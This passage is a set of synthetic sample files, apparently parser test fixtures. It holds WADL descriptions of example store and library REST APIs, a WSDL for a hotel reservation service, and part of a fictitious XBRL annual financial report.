        <doc>Internal server error</doc>
        <representation mediaType="application/json" element="error"/>
      </response>
    </method>
    
    <method name="POST">
      <doc>Create a new resource</doc>
      <request>
        <representation mediaType="application/json"/>
        <representation mediaType="application/xml"/>
      </request>
      <response status="201">
        <doc>Resource created successfully</doc>
        <param name="Location" style="header" type="xsd:anyURI">
          <doc>URL of the newly created resource</doc>
        </param>
      </response>
      <response status="400">
        <doc>Bad request - validation errors</doc>
        <representation mediaType="application/json" element="error"/>
      </response>
      <response status="409">
        <doc>Conflict - resource already exists</doc>
        <representation mediaType="application/json" element="error"/>
      </response>
    </method>
  </resource_type>

  <resource_type id="item">
    <doc>Generic item resource with CRUD operations</doc>
    
    <param name="id" style="template" type="xsd:long" required="true">
      <doc>Unique identifier for the resource</doc>
    </param>
    
    <method name="GET">
      <doc>Retrieve a specific resource by ID</doc>
      <response status="200">
        <doc>Resource found and returned</doc>
      </response>
      <response status="404">
        <doc>Resource not found</doc>
        <representation mediaType="application/json" element="error"/>
      </response>
    </method>
    
    <method name="PUT">
      <doc>Update a resource (full replacement)</doc>
      <request>
        <representation mediaType="application/json"/>
        <representation mediaType="application/xml"/>
      </request>
      <response status="200">
        <doc>Resource updated successfully</doc>
      </response>
      <response status="404">
        <doc>Resource not found</doc>
        <representation mediaType="application/json" element="error"/>
      </response>
      <response status="400">
        <doc>Bad request - validation errors</doc>
        <representation mediaType="application/json" element="error"/>
      </response>
    </method>
    
    <method name="PATCH">
      <doc>Partially update a resource</doc>
      <request>
        <representation mediaType="application/json"/>
        <representation mediaType="application/json-patch+json"/>
      </request>
      <response status="200">
        <doc>Resource updated successfully</doc>
      </response>
      <response status="404">
        <doc>Resource not found</doc>
        <representation mediaType="application/json" element="error"/>
      </response>
    </method>
    
    <method name="DELETE">
      <doc>Delete a resource</doc>
      <response status="204">
        <doc>Resource deleted successfully</doc>
      </response>
      <response status="404">
        <doc>Resource not found</doc>
        <representation mediaType="application/json" element="error"/>
      </response>
      <response status="409">
        <doc>Conflict - resource cannot be deleted</doc>
        <representation mediaType="application/json" element="error"/>
      </response>
    </method>
  </resource_type>

  <!-- Root resources -->
  <resources base="https://api.example-store.com/v2">
    
    <!-- API Information -->
    <resource path="">
      <doc>API root endpoint providing service information</doc>
      <method name="GET">
        <doc>Get API information and available endpoints</doc>
        <response status="200">
          <doc>API information</doc>
          <representation mediaType="application/json">
            <doc>Service metadata in JSON format</doc>
          </representation>
          <representation mediaType="application/hal+json">
            <doc>HAL formatted response with links</doc>
          </representation>
        </response>
      </method>
    </resource>

    <!-- Products Resource -->
    <resource path="products" type="collection">
      <doc>Product catalog management</doc>
      
      <method name="GET">
        <doc>Search and retrieve products with filtering options</doc>
        <request>
          <param name="category" style="query" type="xsd:string">
            <doc>Filter by product category</doc>
          </param>
          <param name="minPrice" style="query" type="xsd:decimal">
            <doc>Minimum price filter</doc>
          </param>
          <param name="maxPrice" style="query" type="xsd:decimal">
            <doc>Maximum price filter</doc>
          </param>
          <param name="inStock" style="query" type="xsd:boolean">
            <doc>Filter by stock availability</doc>
          </param>
          <param name="search" style="query" type="xsd:string">
            <doc>Search term for name and description</doc>
          </param>
        </request>
        <response status="200">
          <doc>List of products matching criteria</doc>
          <representation mediaType="application/json" element="products"/>
          <representation mediaType="application/xml" element="products"/>
        </response>
      </method>
      
      <method name="POST">
        <doc>Create a new product</doc>
        <request>
          <representation mediaType="application/json" element="product"/>
          <representation mediaType="application/xml" element="product"/>
        </request>
        <response status="201">
          <doc>Product created successfully</doc>
          <representation mediaType="application/json" element="product"/>
        </response>
      </method>

      <!-- Individual Product -->
      <resource path="{id}" type="item">
        <doc>Individual product operations</doc>
        
        <method name="GET">
          <doc>Retrieve product details</doc>
          <response status="200">
            <doc>Product details</doc>
            <representation mediaType="application/json" element="product"/>
            <representation mediaType="application/xml" element="product"/>
          </response>
        </method>
        
        <method name="PUT">
          <doc>Update product information</doc>
          <request>
            <representation mediaType="application/json" element="product"/>
            <representation mediaType="application/xml" element="product"/>
          </request>
          <response status="200">
            <doc>Product updated successfully</doc>
            <representation mediaType="application/json" element="product"/>
          </response>
        </method>

        <!-- Product Images -->
        <resource path="images">
          <doc>Product image management</doc>
          
          <method name="GET">
            <doc>Get all images for a product</doc>
            <response status="200">
              <doc>List of product images</doc>
              <representation mediaType="application/json"/>
            </response>
          </method>
          
          <method name="POST">
            <doc>Upload a new product image</doc>
            <request>
              <representation mediaType="multipart/form-data">
                <param name="image" style="form" type="xsd:base64Binary" required="true">
                  <doc>Image file to upload</doc>
                </param>
                <param name="alt" style="form" type="xsd:string">
                  <doc>Alternative text for the image</doc>
                </param>
                <param name="isPrimary" style="form" type="xsd:boolean" default="false">
                  <doc>Set as primary product image</doc>
                </param>
              </representation>
            </request>
            <response status="201">
              <doc>Image uploaded successfully</doc>
            </response>
          </method>

          <resource path="{imageId}">
            <param name="imageId" style="template" type="xsd:long" required="true"/>
            
            <method name="DELETE">
              <doc>Delete a product image</doc>
              <response status="204">
                <doc>Image deleted successfully</doc>
              </response>
            </method>
          </resource>
        </resource>

        <!-- Product Reviews -->
        <resource path="reviews">
          <doc>Product review management</doc>
          
          <method name="GET">
            <doc>Get reviews for a product</doc>
            <request>
              <param name="rating" style="query" type="xsd:int">
                <doc>Filter by star rating (1-5)</doc>
              </param>
              <param name="verified" style="query" type="xsd:boolean">
                <doc>Filter by verified purchase</doc>
              </param>
            </request>
            <response status="200">
              <doc>List of product reviews</doc>
              <representation mediaType="application/json"/>
            </response>
          </method>
          
          <method name="POST">
            <doc>Submit a new review</doc>
            <request>
              <param name="Authorization" style="header" type="xsd:string" required="true">
                <doc>Bearer token for authentication</doc>
              </param>
              <representation mediaType="application/json"/>
            </request>
            <response status="201">
              <doc>Review submitted successfully</doc>
            </response>
            <response status="401">
              <doc>Authentication required</doc>
              <representation mediaType="application/json" element="error"/>
            </response>
          </method>
        </resource>
      </resource>
    </resource>

    <!-- Users Resource -->
    <resource path="users">
      <doc>User account management</doc>
      
      <method name="POST">
        <doc>Register a new user account</doc>
        <request>
          <representation mediaType="application/json">
            <param name="email" style="plain" type="xsd:string" required="true"/>
            <param name="password" style="plain" type="xsd:string" required="true"/>
            <param name="firstName" style="plain" type="xsd:string" required="true"/>
            <param name="lastName" style="plain" type="xsd:string" required="true"/>
          </representation>
        </request>
        <response status="201">
          <doc>User account created</doc>
        </response>
        <response status="409">
          <doc>Email already exists</doc>
          <representation mediaType="application/json" element="error"/>
        </response>
      </method>

      <resource path="me">
        <doc>Current user profile operations</doc>
        
        <method name="GET">
          <doc>Get current user profile</doc>
          <request>
            <param name="Authorization" style="header" type="xsd:string" required="true">
              <doc>Bearer token for authentication</doc>
            </param>
          </request>
          <response status="200">
            <doc>User profile information</doc>
            <representation mediaType="application/json"/>
          </response>
          <response status="401">
            <doc>Authentication required</doc>
            <representation mediaType="application/json" element="error"/>
          </response>
        </method>
        
        <method name="PUT">
          <doc>Update current user profile</doc>
          <request>
            <param name="Authorization" style="header" type="xsd:string" required="true"/>
            <representation mediaType="application/json"/>
          </request>
          <response status="200">
            <doc>Profile updated successfully</doc>
          </response>
        </method>
      </resource>
    </resource>

    <!-- Authentication -->
    <resource path="auth">
      <doc>Authentication and authorization endpoints</doc>
      
      <resource path="login">
        <method name="POST">
          <doc>Authenticate user and obtain access token</doc>
          <request>
            <representation mediaType="application/json">
              <param name="email" style="plain" type="xsd:string" required="true"/>
              <param name="password" style="plain" type="xsd:string" required="true"/>
            </representation>
            <representation mediaType="application/x-www-form-urlencoded">
              <param name="email" style="form" type="xsd:string" required="true"/>
              <param name="password" style="form" type="xsd:string" required="true"/>
            </representation>
          </request>
          <response status="200">
            <doc>Authentication successful</doc>
            <representation mediaType="application/json">
              <param name="access_token" style="plain" type="xsd:string"/>
              <param name="refresh_token" style="plain" type="xsd:string"/>
              <param name="expires_in" style="plain" type="xsd:int"/>
              <param name="token_type" style="plain" type="xsd:string"/>
            </representation>
          </response>
          <response status="401">
            <doc>Invalid credentials</doc>
            <representation mediaType="application/json" element="error"/>
          </response>
        </method>
      </resource>
      
      <resource path="refresh">
        <method name="POST">
          <doc>Refresh access token using refresh token</doc>
          <request>
            <representation mediaType="application/json">
              <param name="refresh_token" style="plain" type="xsd:string" required="true"/>
            </representation>
          </request>
          <response status="200">
            <doc>Token refreshed successfully</doc>
            <representation mediaType="application/json"/>
          </response>
          <response status="401">
            <doc>Invalid refresh token</doc>
            <representation mediaType="application/json" element="error"/>
          </response>
        </method>
      </resource>
    </resource>

    <!-- Orders Resource -->
    <resource path="orders">
      <doc>Order management system</doc>
      
      <method name="GET">
        <doc>Get user's order history</doc>
        <request>
          <param name="Authorization" style="header" type="xsd:string" required="true"/>
          <param name="status" style="query" type="xsd:string">
            <doc>Filter by order status</doc>
            <option value="pending"/>
            <option value="processing"/>
            <option value="shipped"/>
            <option value="delivered"/>
            <option value="cancelled"/>
          </param>
          <param name="dateFrom" style="query" type="xsd:date">
            <doc>Filter orders from this date</doc>
          </param>
          <param name="dateTo" style="query" type="xsd:date">
            <doc>Filter orders to this date</doc>
          </param>
        </request>
        <response status="200">
          <doc>List of user orders</doc>
          <representation mediaType="application/json"/>
        </response>
      </method>
      
      <method name="POST">
        <doc>Create a new order</doc>
        <request>
          <param name="Authorization" style="header" type="xsd:string" required="true"/>
          <representation mediaType="application/json"/>
        </request>
        <response status="201">
          <doc>Order created successfully</doc>
        </response>
        <response status="400">
          <doc>Invalid order data</doc>
          <representation mediaType="application/json" element="error"/>
        </response>
      </method>

      <resource path="{orderId}" type="item">
        <doc>Individual order operations</doc>
        
        <method name="GET">
          <doc>Get order details</doc>
          <request>
            <param name="Authorization" style="header" type="xsd:string" required="true"/>
          </request>
          <response status="200">
            <doc>Order details</doc>
            <representation mediaType="application/json"/>
          </response>
        </method>
        
        <resource path="cancel">
          <method name="POST">
            <doc>Cancel an order</doc>
            <request>
              <param name="Authorization" style="header" type="xsd:string" required="true"/>
              <representation mediaType="application/json">
                <param name="reason" style="plain" type="xsd:string"/>
              </representation>
            </request>
            <response status="200">
              <doc>Order cancelled successfully</doc>
            </response>
            <response status="409">
              <doc>Order cannot be cancelled</doc>
              <representation mediaType="application/json" element="error"/>
            </response>
          </method>
        </resource>
      </resource>
    </resource>

  </resources>
</application>
</file>

<file path="sample_data/test_files_synthetic/small/wadl/simple_api.wadl">
<?xml version="1.0" encoding="UTF-8"?>
<application xmlns="http://wadl.dev.java.net/2009/02">
    <doc title="Simple REST API">
        A basic REST API for managing books in a library system.
        This API demonstrates common CRUD operations.
    </doc>

    <resources base="https://api.library.com/v1">
        <resource path="books">
            <doc>Collection of books in the library</doc>
            
            <method name="GET" id="getBooks">
                <doc>Retrieve all books</doc>
                <request>
                    <param name="limit" style="query" type="xsd:int" default="10">
                        <doc>Maximum number of books to return</doc>
                    </param>
                    <param name="offset" style="query" type="xsd:int" default="0">
                        <doc>Number of books to skip</doc>
                    </param>
                    <param name="category" style="query" type="xsd:string">
                        <doc>Filter books by category</doc>
                    </param>
                </request>
                <response status="200">
                    <doc>Successful response with book list</doc>
                    <representation mediaType="application/json">
                        <doc>JSON array of book objects</doc>
                    </representation>
                    <representation mediaType="application/xml">
                        <doc>XML list of books</doc>
                    </representation>
                </response>
                <response status="400">
                    <doc>Bad request - invalid parameters</doc>
                    <representation mediaType="application/json">
                        <doc>Error message in JSON format</doc>
                    </representation>
                </response>
            </method>
            
            <method name="POST" id="createBook">
                <doc>Create a new book</doc>
                <request>
                    <param name="Authorization" style="header" type="xsd:string" required="true">
                        <doc>Bearer token for authentication</doc>
                    </param>
                    <representation mediaType="application/json">
                        <doc>Book data in JSON format</doc>
                    </representation>
                    <representation mediaType="application/xml">
                        <doc>Book data in XML format</doc>
                    </representation>
                </request>
                <response status="201">
                    <doc>Book created successfully</doc>
                    <representation mediaType="application/json">
                        <doc>Created book object</doc>
                    </representation>
                </response>
                <response status="400">
                    <doc>Bad request - invalid book data</doc>
                </response>
                <response status="401">
                    <doc>Unauthorized - invalid or missing token</doc>
                </response>
            </method>
            
            <resource path="{bookId}">
                <doc>Individual book resource</doc>
                <param name="bookId" style="template" type="xsd:string" required="true">
                    <doc>Unique identifier for the book</doc>
                </param>
                
                <method name="GET" id="getBook">
                    <doc>Retrieve a specific book</doc>
                    <response status="200">
                        <representation mediaType="application/json">
                            <doc>Book object in JSON format</doc>
                        </representation>
                        <representation mediaType="application/xml">
                            <doc>Book object in XML format</doc>
                        </representation>
                    </response>
                    <response status="404">
                        <doc>Book not found</doc>
                        <representation mediaType="application/json">
                            <doc>Error message</doc>
                        </representation>
                    </response>
                </method>
                
                <method name="PUT" id="updateBook">
                    <doc>Update an existing book</doc>
                    <request>
                        <param name="Authorization" style="header" type="xsd:string" required="true">
                            <doc>Bearer token for authentication</doc>
                        </param>
                        <representation mediaType="application/json">
                            <doc>Updated book data</doc>
                        </representation>
                    </request>
                    <response status="200">
                        <doc>Book updated successfully</doc>
                        <representation mediaType="application/json">
                            <doc>Updated book object</doc>
                        </representation>
                    </response>
                    <response status="404">
                        <doc>Book not found</doc>
                    </response>
                    <response status="401">
                        <doc>Unauthorized</doc>
                    </response>
                </method>
                
                <method name="DELETE" id="deleteBook">
                    <doc>Delete a book</doc>
                    <request>
                        <param name="Authorization" style="header" type="xsd:string" required="true">
                            <doc>Bearer token for authentication</doc>
                        </param>
                    </request>
                    <response status="204">
                        <doc>Book deleted successfully</doc>
                    </response>
                    <response status="404">
                        <doc>Book not found</doc>
                    </response>
                    <response status="401">
                        <doc>Unauthorized</doc>
                    </response>
                </method>
            </resource>
        </resource>
        
        <resource path="authors">
            <doc>Collection of authors</doc>
            
            <method name="GET" id="getAuthors">
                <doc>Retrieve all authors</doc>
                <request>
                    <param name="search" style="query" type="xsd:string">
                        <doc>Search authors by name</doc>
                    </param>
                </request>
                <response status="200">
                    <representation mediaType="application/json">
                        <doc>JSON array of author objects</doc>
                    </representation>
                </response>
            </method>
        </resource>
    </resources>
</application>
</file>

<file path="sample_data/test_files_synthetic/small/wsdl/hotel-reservation-service.wsdl">
<?xml version="1.0" encoding="UTF-8"?>
<description xmlns="http://www.w3.org/ns/wsdl" 
             targetNamespace="http://example.com/hotel/reservation/wsdl"
             xmlns:tns="http://example.com/hotel/reservation/wsdl"
             xmlns:rns="http://example.com/hotel/reservation/schema"
             xmlns:wsoap="http://www.w3.org/ns/wsdl/soap"
             xmlns:soap="http://www.w3.org/2003/05/soap-envelope">

  <documentation>
    Hotel Reservation Service WSDL 2.0 Definition
    This service provides hotel room reservation functionality
    including checking availability and making reservations.
  </documentation>

  <!-- Type definitions -->
  <types>
    <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" 
               targetNamespace="http://example.com/hotel/reservation/schema"
               elementFormDefault="qualified">
      
      <!-- Request message types -->
      <xs:element name="checkAvailabilityRequest">
        <xs:complexType>
          <xs:sequence>
            <xs:element name="hotelId" type="xs:string"/>
            <xs:element name="checkInDate" type="xs:date"/>
            <xs:element name="checkOutDate" type="xs:date"/>
            <xs:element name="roomType" type="xs:string"/>
            <xs:element name="numberOfGuests" type="xs:int"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      
      <xs:element name="makeReservationRequest">
        <xs:complexType>
          <xs:sequence>
            <xs:element name="hotelId" type="xs:string"/>
            <xs:element name="checkInDate" type="xs:date"/>
            <xs:element name="checkOutDate" type="xs:date"/>
            <xs:element name="roomType" type="xs:string"/>
            <xs:element name="numberOfGuests" type="xs:int"/>
            <xs:element name="guestInfo" type="rns:GuestInfoType"/>
            <xs:element name="paymentInfo" type="rns:PaymentInfoType"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      
      <!-- Response message types -->
      <xs:element name="checkAvailabilityResponse">
        <xs:complexType>
          <xs:sequence>
            <xs:element name="available" type="xs:boolean"/>
            <xs:element name="roomsAvailable" type="xs:int" minOccurs="0"/>
            <xs:element name="pricePerNight" type="xs:decimal" minOccurs="0"/>
            <xs:element name="currency" type="xs:string" minOccurs="0"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      
      <xs:element name="makeReservationResponse">
        <xs:complexType>
          <xs:sequence>
            <xs:element name="reservationId" type="xs:string"/>
            <xs:element name="confirmationNumber" type="xs:string"/>
            <xs:element name="totalAmount" type="xs:decimal"/>
            <xs:element name="currency" type="xs:string"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      
      <!-- Fault message types -->
      <xs:element name="invalidDataFault">
        <xs:complexType>
          <xs:sequence>
            <xs:element name="errorCode" type="xs:string"/>
            <xs:element name="errorMessage" type="xs:string"/>
            <xs:element name="fieldName" type="xs:string" minOccurs="0"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      
      <xs:element name="noAvailabilityFault">
        <xs:complexType>
          <xs:sequence>
            <xs:element name="errorCode" type="xs:string"/>
            <xs:element name="errorMessage" type="xs:string"/>
            <xs:element name="alternativeDates" type="xs:string" minOccurs="0"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      
      <!-- Complex types -->
      <xs:complexType name="GuestInfoType">
        <xs:sequence>
          <xs:element name="firstName" type="xs:string"/>
          <xs:element name="lastName" type="xs:string"/>
          <xs:element name="email" type="xs:string"/>
          <xs:element name="phone" type="xs:string"/>
          <xs:element name="address" type="rns:AddressType"/>
        </xs:sequence>
      </xs:complexType>
      
      <xs:complexType name="AddressType">
        <xs:sequence>
          <xs:element name="street" type="xs:string"/>
          <xs:element name="city" type="xs:string"/>
          <xs:element name="state" type="xs:string"/>
          <xs:element name="zipCode" type="xs:string"/>
          <xs:element name="country" type="xs:string"/>
        </xs:sequence>
      </xs:complexType>
      
      <xs:complexType name="PaymentInfoType">
        <xs:sequence>
          <xs:element name="cardType" type="xs:string"/>
          <xs:element name="cardNumber" type="xs:string"/>
          <xs:element name="expiryDate" type="xs:string"/>
          <xs:element name="cvv" type="xs:string"/>
          <xs:element name="cardHolderName" type="xs:string"/>
        </xs:sequence>
      </xs:complexType>
      
    </xs:schema>
  </types>

  <!-- Interface definition -->
  <interface name="HotelReservationInterface">
    
    <!-- Check Availability Operation -->
    <operation name="checkAvailability" pattern="http://www.w3.org/ns/wsdl/in-out">
      <documentation>Check room availability for specified dates and criteria</documentation>
      <input messageLabel="In" element="rns:checkAvailabilityRequest"/>
      <output messageLabel="Out" element="rns:checkAvailabilityResponse"/>
      <outfault messageLabel="Out" ref="tns:InvalidDataFault"/>
      <outfault messageLabel="Out" ref="tns:NoAvailabilityFault"/>
    </operation>
    
    <!-- Make Reservation Operation -->
    <operation name="makeReservation" pattern="http://www.w3.org/ns/wsdl/in-out">
      <documentation>Create a new hotel reservation</documentation>
      <input messageLabel="In" element="rns:makeReservationRequest"/>
      <output messageLabel="Out" element="rns:makeReservationResponse"/>
      <outfault messageLabel="Out" ref="tns:InvalidDataFault"/>
      <outfault messageLabel="Out" ref="tns:NoAvailabilityFault"/>
    </operation>
    
    <!-- Fault definitions -->
    <fault name="InvalidDataFault" element="rns:invalidDataFault"/>
    <fault name="NoAvailabilityFault" element="rns:noAvailabilityFault"/>
    
  </interface>

  <!-- SOAP Binding -->
  <binding name="HotelReservationSOAPBinding" 
           interface="tns:HotelReservationInterface" 
           type="http://www.w3.org/ns/wsdl/soap"
           wsoap:protocol="http://www.w3.org/2003/05/soap/bindings/HTTP/">
    
    <!-- Default SOAP binding properties -->
    <wsoap:version>1.2</wsoap:version>
    <wsoap:transport>http://www.w3.org/2003/05/soap/bindings/HTTP/</wsoap:transport>
    
    <!-- Operation bindings -->
    <operation ref="tns:checkAvailability" 
               wsoap:mep="http://www.w3.org/2003/05/soap/mep/request-response/">
      <wsoap:operation soapAction="http://example.com/hotel/reservation/checkAvailability"/>
    </operation>
    
    <operation ref="tns:makeReservation"
               wsoap:mep="http://www.w3.org/2003/05/soap/mep/request-response/">
      <wsoap:operation soapAction="http://example.com/hotel/reservation/makeReservation"/>
    </operation>
    
  </binding>

  <!-- Service definition -->
  <service name="HotelReservationService" interface="tns:HotelReservationInterface">
    <documentation>Hotel Reservation Web Service</documentation>
    <endpoint name="HotelReservationSOAPEndpoint" 
              binding="tns:HotelReservationSOAPBinding"
              address="http://example.com/hotel/reservation/soap"/>
  </service>

</description>
</file>

<file path="sample_data/test_files_synthetic/small/xbrl/financial-report-2024.xml">
<?xml version="1.0" encoding="UTF-8"?>
<xbrl xmlns="http://www.xbrl.org/2003/instance" 
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:link="http://www.xbrl.org/2003/linkbase"
      xmlns:xlink="http://www.w3.org/1999/xlink"
      xmlns:iso4217="http://www.xbrl.org/2003/iso4217"
      xmlns:us-gaap="http://fasb.org/us-gaap/2023"
      xmlns:dei="http://xbrl.sec.gov/dei/2023"
      xmlns:exco="http://example.com/xbrl/taxonomy/2025"
      xsi:schemaLocation="http://www.xbrl.org/2003/instance http://www.xbrl.org/2003/xbrl-instance-2003-12-31.xsd
                          http://fasb.org/us-gaap/2023 https://xbrl.fasb.org/us-gaap/2023/elts/us-gaap-2023.xsd
                          http://xbrl.sec.gov/dei/2023 https://xbrl.sec.gov/dei/2023/dei-2023.xsd">

  <!-- Schema References -->
  <link:schemaRef xlink:type="simple" 
                  xlink:href="https://xbrl.fasb.org/us-gaap/2023/elts/us-gaap-2023.xsd"/>
  <link:schemaRef xlink:type="simple" 
                  xlink:href="https://xbrl.sec.gov/dei/2023/dei-2023.xsd"/>

  <!-- Contexts -->
  
  <!-- Current Period Context -->
  <context id="FY2024">
    <entity>
      <identifier scheme="http://www.sec.gov/CIK">0001234567</identifier>
    </entity>
    <period>
      <startDate>2024-01-01</startDate>
      <endDate>2024-12-31</endDate>
    </period>
  </context>

  <!-- Previous Period Context -->
  <context id="FY2023">
    <entity>
      <identifier scheme="http://www.sec.gov/CIK">0001234567</identifier>
    </entity>
    <period>
      <startDate>2023-01-01</startDate>
      <endDate>2023-12-31</endDate>
    </period>
  </context>

  <!-- As of Period End Context -->
  <context id="AsOf2024">
    <entity>
      <identifier scheme="http://www.sec.gov/CIK">0001234567</identifier>
    </entity>
    <period>
      <instant>2024-12-31</instant>
    </period>
  </context>

  <!-- As of Previous Period End Context -->
  <context id="AsOf2023">
    <entity>
      <identifier scheme="http://www.sec.gov/CIK">0001234567</identifier>
    </entity>
    <period>
      <instant>2023-12-31</instant>
    </period>
  </context>

  <!-- Quarterly Context -->
  <context id="Q4-2024">
    <entity>
      <identifier scheme="http://www.sec.gov/CIK">0001234567</identifier>
    </entity>
    <period>
      <startDate>2024-10-01</startDate>
      <endDate>2024-12-31</endDate>
    </period>
  </context>

  <!-- Geographic Segment Context -->
  <context id="FY2024-NorthAmerica">
    <entity>
      <identifier scheme="http://www.sec.gov/CIK">0001234567</identifier>
      <segment>
        <explicitMember dimension="us-gaap:GeographyAxis">exco:NorthAmericaMember</explicitMember>
      </segment>
    </entity>
    <period>
      <startDate>2024-01-01</startDate>
      <endDate>2024-12-31</endDate>
    </period>
  </context>

  <context id="FY2024-Europe">
    <entity>
      <identifier scheme="http://www.sec.gov/CIK">0001234567</identifier>
      <segment>
        <explicitMember dimension="us-gaap:GeographyAxis">exco:EuropeMember</explicitMember>
      </segment>
    </entity>
    <period>
      <startDate>2024-01-01</startDate>
      <endDate>2024-12-31</endDate>
    </period>
  </context>

  <!-- Business Segment Context -->
  <context id="FY2024-ProductSales">
    <entity>
      <identifier scheme="http://www.sec.gov/CIK">0001234567</identifier>
      <segment>
        <explicitMember dimension="us-gaap:ProductOrServiceAxis">exco:ProductSalesMember</explicitMember>
      </segment>
    </entity>
    <period>
      <startDate>2024-01-01</startDate>
      <endDate>2024-12-31</endDate>
    </period>
  </context>

  <context id="FY2024-Services">
    <entity>
      <identifier scheme="http://www.sec.gov/CIK">0001234567</identifier>
      <segment>
        <explicitMember dimension="us-gaap:ProductOrServiceAxis">exco:ServicesMember</explicitMember>
      </segment>
    </entity>
    <period>
      <startDate>2024-01-01</startDate>
      <endDate>2024-12-31</endDate>
    </period>
  </context>

  <!-- Document Identification Context -->
  <context id="DocumentInfo">
    <entity>
      <identifier scheme="http://www.sec.gov/CIK">0001234567</identifier>
    </entity>
    <period>
      <instant>2024-12-31</instant>
    </period>
  </context>

  <!-- Units -->
  <unit id="USD">
    <measure>iso4217:USD</measure>
  </unit>

  <unit id="shares">
    <measure>shares</measure>
  </unit>

  <unit id="pure">
    <measure>pure</measure>
  </unit>

  <unit id="USDPerShare">
    <divide>
      <unitNumerator>
        <measure>iso4217:USD</measure>
      </unitNumerator>
      <unitDenominator>
        <measure>shares</measure>
      </unitDenominator>
    </divide>
  </unit>

  <!-- Document and Entity Information -->
  <dei:EntityRegistrantName contextRef="DocumentInfo">Example Technology Corporation</dei:EntityRegistrantName>
  <dei:EntityCentralIndexKey contextRef="DocumentInfo">0001234567</dei:EntityCentralIndexKey>
  <dei:DocumentType contextRef="DocumentInfo">10-K</dei:DocumentType>
  <dei:DocumentPeriodEndDate contextRef="DocumentInfo">2024-12-31</dei:DocumentPeriodEndDate>
  <dei:EntityFilerCategory contextRef="DocumentInfo">Large Accelerated Filer</dei:EntityFilerCategory>
  <dei:EntityPublicFloat contextRef="DocumentInfo" unitRef="USD">15750000000</dei:EntityPublicFloat>
  <dei:EntityCommonStockSharesOutstanding contextRef="AsOf2024" unitRef="shares">125000000</dei:EntityCommonStockSharesOutstanding>
  <dei:EntityIncorporationStateCountryCode contextRef="DocumentInfo">DE</dei:EntityIncorporationStateCountryCode>
  <dei:EntityTaxIdentificationNumber contextRef="DocumentInfo">54-1234567</dei:EntityTaxIdentificationNumber>
  <dei:EntityAddressAddressLine1 contextRef="DocumentInfo">123 Technology Drive</dei:EntityAddressAddressLine1>
  <dei:EntityAddressCityOrTown contextRef="DocumentInfo">San Francisco</dei:EntityAddressCityOrTown>
  <dei:EntityAddressStateOrProvince contextRef="DocumentInfo">CA</dei:EntityAddressStateOrProvince>
  <dei:EntityAddressPostalZipCode contextRef="DocumentInfo">94105</dei:EntityAddressPostalZipCode>
  <dei:EntityAddressCountry contextRef="DocumentInfo">US</dei:EntityAddressCountry>

  <!-- Income Statement Facts -->
  
  <!-- Revenue -->
  <us-gaap:Revenues contextRef="FY2024" unitRef="USD" decimals="-6">2850000000</us-gaap:Revenues>
  <us-gaap:Revenues contextRef="FY2023" unitRef="USD" decimals="-6">2675000000</us-gaap:Revenues>
  <us-gaap:Revenues contextRef="Q4-2024" unitRef="USD" decimals="-6">785000000</us-gaap:Revenues>

  <!-- Revenue by Segment -->
  <us-gaap:Revenues contextRef="FY2024-ProductSales" unitRef="USD" decimals="-6">1995000000</us-gaap:Revenues>
  <us-gaap:Revenues contextRef="FY2024-Services" unitRef="USD" decimals="-6">855000000</us-gaap:Revenues>

  <!-- Revenue by Geography -->
  <us-gaap:Revenues contextRef="FY2024-NorthAmerica" unitRef="USD" decimals="-6">1710000000</us-gaap:Revenues>
  <us-gaap:Revenues contextRef="FY2024-Europe" unitRef="USD" decimals="-6">1140000000</us-gaap:Revenues>

  <!-- Cost of Revenue -->
  <us-gaap:CostOfGoodsAndServicesSold contextRef="FY2024" unitRef="USD" decimals="-6">1425000000</us-gaap:CostOfGoodsAndServicesSold>
  <us-gaap:CostOfGoodsAndServicesSold contextRef="FY2023" unitRef="USD" decimals="-6">1340000000</us-gaap:CostOfGoodsAndServicesSold>

  <!-- Gross Profit -->
  <us-gaap:GrossProfit contextRef="FY2024" unitRef="USD" decimals="-6">1425000000</us-gaap:GrossProfit>
  <us-gaap:GrossProfit contextRef="FY2023" unitRef="USD" decimals="-6">1335000000</us-gaap:GrossProfit>

  <!-- Operating Expenses -->
  <us-gaap:ResearchAndDevelopmentExpense contextRef="FY2024" unitRef="USD" decimals="-6">428000000</us-gaap:ResearchAndDevelopmentExpense>
  <us-gaap:ResearchAndDevelopmentExpense contextRef="FY2023" unitRef="USD" decimals="-6">401000000</us-gaap:ResearchAndDevelopmentExpense>

  <us-gaap:SellingGeneralAndAdministrativeExpense contextRef="FY2024" unitRef="USD" decimals="-6">342000000</us-gaap:SellingGeneralAndAdministrativeExpense>
  <us-gaap:SellingGeneralAndAdministrativeExpense contextRef="FY2023" unitRef="USD" decimals="-6">321000000</us-gaap:SellingGeneralAndAdministrativeExpense>

  <!-- Operating Income -->
  <us-gaap:OperatingIncomeLoss contextRef="FY2024" unitRef="USD" decimals="-6">655000000</us-gaap:OperatingIncomeLoss>
  <us-gaap:OperatingIncomeLoss contextRef="FY2023" unitRef="USD" decimals="-6">613000000</us-gaap:OperatingIncomeLoss>

  <!-- Interest and Other Income -->
  <us-gaap:InterestIncomeExpenseNet contextRef="FY2024" unitRef="USD" decimals="-6">45000000</us-gaap:InterestIncomeExpenseNet>
  <us-gaap:InterestIncomeExpenseNet contextRef="FY2023" unitRef="USD" decimals="-6">38000000</us-gaap:InterestIncomeExpenseNet>

  <!-- Income Before Taxes -->
  <us-gaap:IncomeLossFromContinuingOperationsBeforeIncomeTaxesExtraordinaryItemsNoncontrollingInterest contextRef="FY2024" unitRef="USD" decimals="-6">700000000</us-gaap:IncomeLossFromContinuingOperationsBeforeIncomeTaxesExtraordinaryItemsNoncontrollingInterest>
  <us-gaap:IncomeLossFromContinuingOperationsBeforeIncomeTaxesExtraordinaryItemsNoncontrollingInterest contextRef="FY2023" unitRef="USD" decimals="-6">651000000</us-gaap:IncomeLossFromContinuingOperationsBeforeIncomeTaxesExtraordinaryItemsNoncontrollingInterest>

  <!-- Income Tax Expense -->
  <us-gaap:IncomeTaxExpenseBenefit contextRef="FY2024" unitRef="USD" decimals="-6">147000000</us-gaap:IncomeTaxExpenseBenefit>
